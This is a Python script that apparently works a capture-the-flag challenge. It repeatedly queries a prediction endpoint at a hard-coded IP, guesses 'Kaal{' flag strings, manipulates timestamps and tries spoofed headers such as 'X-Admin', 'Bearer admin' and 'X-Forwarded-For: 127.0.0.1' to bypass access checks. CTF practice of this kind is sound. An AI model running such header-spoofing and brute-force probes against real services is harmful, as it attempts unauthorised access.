import requests
import json
import struct
from datetime import datetime, timedelta

base_url = "http://138.199.163.92:10675"

# NUCLEAR OPTION 1: The score 1.0000001192092896 might encode data
print("=== Analyzing score value for hidden data ===")
r = requests.post(f"{base_url}/predict", json={"text": "time wheel", "timestamp": "2024-01-01T00:00:00"})
score = r.json()["score"]
print(f"Score: {score}")
print(f"Score hex: {float.hex(score)}")
print(f"Score as int: {int(score * 1000000000)}")

# Try interpreting the fractional part
frac = score - 1.0
print(f"Fractional part: {frac}")
print(f"Frac * 2^32: {int(frac * (2**32))}")
print(f"Frac as hex: {hex(int(frac * (2**32)))}")

# NUCLEAR OPTION 2: Send timestamp that matches the score
print("\n=== Trying timestamp derived from score ===")
timestamp_from_score = f"2024-01-01T00:00:{int(frac * 60):02d}"
r = requests.post(f"{base_url}/predict", json={"text": "time wheel", "timestamp": timestamp_from_score})
print(f"Response: {r.json()}")

# NUCLEAR OPTION 3: The "cyclic" nature means send SAME timestamp multiple times until cycle completes
print("\n=== Trying cyclic requests (12 times = full cycle) ===")
for i in range(1, 13):
    r = requests.post(f"{base_url}/predict", json={"text": "time wheel", "timestamp": "2024-01-01T00:00:00"})
    data = r.json()
    print(f"Request {i}: {data}")
    if "Kaal{" in str(data) or data.get("tone") != "Bravo ! Almost there.":
        print(f"!!! CHANGE AT REQUEST {i} !!!")
        break

# NUCLEAR OPTION 4: Try timestamp that represents a COMPLETE cycle (same time, different date)
print("\n=== Trying same time on different dates (cycle) ===")
base_date = datetime(2024, 1, 1, 0, 0, 0)
for days in [0, 365, 730, 1095]:  # 0, 1, 2, 3 years
    ts = (base_date + timedelta(days=days)).isoformat()
    r = requests.post(f"{base_url}/predict", json={"text": "time wheel", "timestamp": ts})
    data = r.json()
    if "Kaal{" in str(data):
        print(f"FLAG at {ts}: {data}")
        break

# NUCLEAR OPTION 5: Check if we need to send the EXACT timestamp when the challenge was created
print("\n=== Trying current server time ===")
r = requests.get(f"{base_url}/")
server_date = r.headers.get("date")
print(f"Server date: {server_date}")

# Parse and use server time
from email.utils import parsedate_to_datetime
if server_date:
    server_dt = parsedate_to_datetime(server_date)
    ts = server_dt.isoformat()
    r = requests.post(f"{base_url}/predict", json={"text": "time wheel", "timestamp": ts})
    print(f"Using server time: {r.json()}")

# NUCLEAR OPTION 6: Try sending text that's exactly the flag format
print("\n=== Trying flag format as input ===")
flag_attempts = [
    "Kaal{}", "Kaal{flag}", "Kaal{time_wheel}", "Kaal{kaalchakra}",
    "Kaal{cyclic_time}", "Kaal{wheel_of_time}", "Kaal{100}",
]
for flag in flag_attempts:
    r = requests.post(f"{base_url}/predict", json={"text": flag, "timestamp": "2024-01-01T00:00:00"})
    data = r.json()
    if data.get("progress", 0) > 50 or "Kaal{" in str(data):
        print(f"{flag}: {data}")

# NUCLEAR OPTION 7: Check if there's a rate limit bypass or need to wait
print("\n=== Checking for time-based unlock ===")
import time
r1 = requests.post(f"{base_url}/predict", json={"text": "time wheel", "timestamp": "2024-01-01T00:00:00"})
time.sleep(2)
r2 = requests.post(f"{base_url}/predict", json={"text": "time wheel", "timestamp": "2024-01-01T00:00:00"})
if r1.text != r2.text:
    print(f"RESPONSES DIFFER!")
    print(f"R1: {r1.json()}")
    print(f"R2: {r2.json()}")

# NUCLEAR OPTION 8: Try HTTP headers manipulation
print("\n=== Trying special headers ===")
headers_list = [
    {"X-Flag": "true"},
    {"X-Admin": "true"},
    {"X-Debug": "true"},
    {"Authorization": "Bearer admin"},
    {"X-Forwarded-For": "127.0.0.1"},
]
for headers in headers_list:
    r = requests.post(f"{base_url}/predict", json={"text": "time wheel", "timestamp": "2024-01-01T00:00:00"}, headers=headers)
    if "Kaal{" in r.text:
        print(f"FLAG with headers {headers}: {r.text}")
